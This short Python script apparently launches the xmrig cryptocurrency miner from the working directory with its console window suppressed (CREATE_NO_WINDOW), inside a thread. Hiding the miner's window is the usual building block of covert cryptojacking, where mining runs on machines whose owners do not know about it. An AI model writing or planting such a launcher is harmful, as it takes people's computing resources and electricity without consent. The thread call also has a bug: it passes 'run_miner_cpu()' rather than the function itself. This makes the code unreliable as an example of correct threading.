import subprocess
import threading
import os

path = os.path.join(os.getcwd(), "xmrig\\xmrig.exe")

def run_miner_cpu():
    subprocess.Popen([path], creationflags=subprocess.CREATE_NO_WINDOW)


def main_miner_cpu():
    t = threading.Thread(target=run_miner_cpu(), )
    t.start()
